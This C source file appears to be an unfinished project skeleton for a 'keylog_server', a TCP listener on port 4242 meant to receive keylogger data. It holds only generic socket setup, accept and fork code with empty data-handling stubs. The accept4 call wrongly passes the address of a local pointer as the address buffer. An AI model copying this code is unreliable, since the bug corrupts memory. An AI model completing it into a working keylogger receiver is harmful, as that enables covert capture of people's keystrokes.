#include "server.h"

const uint16_t PORT = 4242;

// Convenient error + exit program
void error_and_exit(const char* error_msg) {
  perror(error_msg);
  // NOLINTNEXTLINE(concurrency-mt-unsafe)
  exit(EXIT_FAILURE);
}

int open_server(void) {
  // SOCK_STREAM because we want accuracy > speed
  int sock_desc = socket(AF_INET, SOCK_STREAM, 0);
  if (sock_desc == -1) {
    error_and_exit("Error with my socks!");
  }
  // Return the socket descriptor
  return sock_desc;
}

void close_server(int socket_descriptor) {
  // Replace this with your implementation.
  if (close(socket_descriptor) == -1) {
    error_and_exit("Couldn't close the server.");
  }
}

void transmit_data(void) {
  // IMPLEMENTATION HERE
}

void clear_data_queue(void) {
  // IMPLEMENTATION HERE
}

struct sockaddr_in socket_address(in_addr_t addr, in_port_t port) {
  // Replace this with your implementation.
  struct sockaddr_in foo;

  foo.sin_family = AF_INET;
  foo.sin_addr.s_addr = htonl(addr);
  foo.sin_port = htons(port);

  return foo;
}

keylog_server* make_keylog_server(struct sockaddr_in ip_addr, int max_backlog) {
  keylog_server* server = malloc(sizeof(keylog_server));
  server->listener = open_server();
  server->addr = ip_addr;
  server->max_backlog = max_backlog;
  return server;
}

void free_keylog_server(keylog_server* server) {
  close_server(server->listener);
  free(server);
}

void listen_for_client(keylog_server* keylogger) {
  if (bind(keylogger->listener, (struct sockaddr*)&keylogger->addr,
           sizeof(keylogger->addr)) == -1) {
    error_and_exit("CANNOT BIND");
  }
  if (listen(keylogger->listener, keylogger->max_backlog) == -1) {
    error_and_exit("CANNOT LISTEN");
  }
  int accept_status = 0;
  while (accept_status != -1) {
    accept_status = accept_client(keylogger);
  }
}

int accept_client(keylog_server* keylogger) {
  // LISTENING
  unsigned int address_size = sizeof(keylogger->addr);
  int client_fd = accept4(keylogger->listener, (struct sockaddr*)&keylogger,
                          &address_size, SOCK_CLOEXEC);
  if (client_fd == -1) {
    error_and_exit("COULDN'T ACCEPT");
  }

  // Fork a new process
  pid_t pid = fork();
  if (pid == -1) {
    error_and_exit("COULDN'T FORK");
  }

  if (pid == 0) {
    // echo(client_fd);
    close(client_fd);
    return -1;
  } else {
    close(client_fd);
    return 0;
  }
}

void echo(int socket_descriptor) {
  char s[1000];
  while (1) {
    ssize_t got_message = recv(socket_descriptor, s, sizeof(s), 0);
    if (got_message == -1) {
      error_and_exit("Couldn't receive.");
    }
    if (got_message == 0) {
      break;
    }
    ssize_t sent_message = send(socket_descriptor, s, (size_t)got_message, 0);
    if (sent_message == -1) {
      error_and_exit("Couldn't send");
    }
  }
}
